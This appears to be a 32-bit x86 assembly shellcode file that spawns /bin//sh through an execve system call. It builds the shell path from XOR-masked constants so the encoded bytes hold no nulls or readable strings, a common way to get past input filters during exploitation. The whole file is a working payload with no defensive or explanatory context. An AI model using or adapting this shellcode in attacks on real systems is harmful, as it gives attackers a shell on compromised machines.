BITS 32

  xor eax, eax        ; zero our eax
  push eax            ; push some nulls for string termination
  xor ebx, ebx        ; Zero out ebx
  xor ebx, 0xffffffff ; Put mask : mask = 0xffffffff
  xor ebx, 0x978cd0d0 ; 0x978cd0d0 = "//sh" ^ mask
  push ebx            ; Push "//sh"
  xor ebx, 0xdeadbeef ; Put mask : mask = 0xb6de91c0 = 0x68732f2f ^ 0xdeadbeef
  xor ebx, 0xd8b7f3ef ; 0xd8b7f3ef = "/bin" ^ mask
  push ebx            ; Push "/bin"
  mov ebx, esp
  push eax
  mov edx, esp
  push ebx
  mov ecx, esp
  mov al, 11
  int 0x80
